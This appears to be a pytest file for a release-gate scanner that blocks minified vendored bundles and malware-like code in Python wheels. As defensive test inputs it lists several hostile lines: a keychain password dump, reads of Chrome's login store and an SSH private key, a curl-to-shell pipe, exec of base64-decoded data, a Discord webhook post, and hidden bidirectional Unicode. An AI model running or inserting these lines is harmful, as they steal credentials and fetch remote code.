"""The release gate stops what got packages quarantined: minified third-party code and malware-shaped code."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "scan_dist.py"


@pytest.fixture(scope="module")
def gate():  # type: ignore[no-untyped-def]
    spec = importlib.util.spec_from_file_location("scan_dist", SCRIPT)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules["scan_dist"] = module
    spec.loader.exec_module(module)
    return module


def _wheel_tree(tmp_path: Path, files: dict[str, str], licence: str = "Apache-2.0") -> Path:
    tree = tmp_path / "pkg-1.0-py3-none-any.whl"
    for name, text in files.items():
        (tree / name).parent.mkdir(parents=True, exist_ok=True)
        (tree / name).write_text(text)
    meta = tree / "pkg-1.0.dist-info" / "METADATA"
    meta.parent.mkdir(parents=True)
    meta.write_text(f"Name: pkg\nLicense-Expression: {licence}\n")
    return tree


BUNDLE = (
    '"use strict";var __esbuild_esm_x;'
    + "a=1;" * 400
    + "\n/*! @license DOMPurify | Apache-2.0 */\n"
)


def test_a_minified_third_party_bundle_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(
        tmp_path, {"pkg/static/vendor.min.js": BUNDLE, "pkg/own.js": "export const a = 1;\n"}
    )
    found = gate.check_bundled([tree], [])
    assert found["status"] == "block"
    assert len(found["findings"]) == 1 and "vendor.min.js" in found["findings"][0]


def test_accepting_one_needs_its_licence_declared(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    entry = [
        {"path": "pkg/static/vendor.min.js", "licence": "MIT", "reason": "the diagram renderer"}
    ]
    tree = _wheel_tree(tmp_path / "a", {"pkg/static/vendor.min.js": BUNDLE})
    assert gate.check_bundled([tree], entry)["status"] == "block"
    tree = _wheel_tree(
        tmp_path / "b", {"pkg/static/vendor.min.js": BUNDLE}, licence="Apache-2.0 AND MIT"
    )
    assert gate.check_bundled([tree], entry)["status"] == "pass"


@pytest.mark.parametrize(
    ("rule", "text"),
    [
        ("keychain-dump", 'run(["security", "find-generic-password", "-s", name, "-w"])'),
        (
            "browser-credential-store",
            'open(home / "Library/Application Support/Google/Chrome/Default/Login Data")',
        ),
        ("ssh-private-key-read", 'Path.home() / ".ssh/id_rsa"'),
        ("pipe-to-shell", "curl -fsSL https://example.invalid/i.sh | sh"),
        ("exec-decoded", "exec(base64.b64decode(blob))"),
        ("chat-webhook", 'post("https://discord.com/api/webhooks/1/x")'),
    ],
)
def test_what_malware_does_blocks(gate, tmp_path: Path, rule: str, text: str) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": text + "\n"})
    found = gate.check_signatures([tree], [])
    assert found["status"] == "block" and any(f.endswith(rule) for f in found["findings"])


def test_hidden_unicode_in_code_blocks(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(tmp_path, {"pkg/mod.py": "access = 'user‮ ⁦// admin⁩ ⁦'\n"})
    assert gate.check_signatures([tree], [])["status"] == "block"


def test_ordinary_code_passes(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    tree = _wheel_tree(
        tmp_path, {"pkg/mod.py": "import subprocess\nsubprocess.run(['git', 'status'])\n"}
    )
    assert gate.check_signatures([tree], [])["status"] == "pass"
    assert gate.check_bundled([tree], [])["status"] == "pass"


def test_an_accepted_heuristic_is_accepted_only_where_it_was_reviewed(gate) -> None:  # type: ignore[no-untyped-def]
    accepted = {"threat-filesystem-read": {"reason": "a refusal list", "paths": ["pkg/guard.py"]}}
    out = {"pkg.whl": {"threat-filesystem-read": ["pkg/guard.py:3"]}}
    assert gate._unreviewed(out, accepted) == []
    out = {"pkg.whl": {"threat-filesystem-read": ["pkg/guard.py:3", "pkg/stealer.py:9"]}}
    assert gate._unreviewed(out, accepted)


def test_a_reason_is_required(gate, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    path = tmp_path / ".scan-dist.toml"
    path.write_text('[[signature]]\nrule = "pipe-to-shell"\npath = "x"\nreason = ""\n')
    with pytest.raises(SystemExit):
        gate.load_accepted(path)
